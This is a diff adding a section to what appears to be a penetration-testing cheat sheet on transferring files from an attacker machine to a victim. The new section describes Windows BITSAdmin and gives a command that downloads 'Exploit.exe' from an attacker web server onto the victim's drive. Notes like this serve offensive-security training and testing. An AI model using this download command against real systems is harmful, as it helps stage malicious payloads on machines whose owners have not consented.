@@ -13,6 +13,8 @@
 
 * ### 6. PuTTY secure copy client (pscp)
 
+* ### 7. Windows BITSAdmin
+
 ----------------------------------------------------------------------
 
 ## 1. Transfer file from attacker machine to victim after initial connection
@@ -174,3 +176,9 @@ You can then use the FTP app to move files from Windows to Linux and back using 
 `pscp username@<linux_IP>:/path/to/file.txt C:\path\to\destination\file.txt`
 
 -------------------------------------------------------
+
+## 7. Windows BITSAdmin
+
+- `BITS (Background Intelligent Transfer Service)` is an essential component of Windows XP and later versions of Windows operating systems. BITS is used by system administrators and programmers for downloading files from or uploading files to HTTP webservers and SMB file shares. BITSAdmin is a tool that is used to create download or upload jobs and monitor their progress.
+
+`bitsadmin /transfer Exploit.exe http://<web_server_IP>/share/Exploit.exe C:\Exploit.exe`
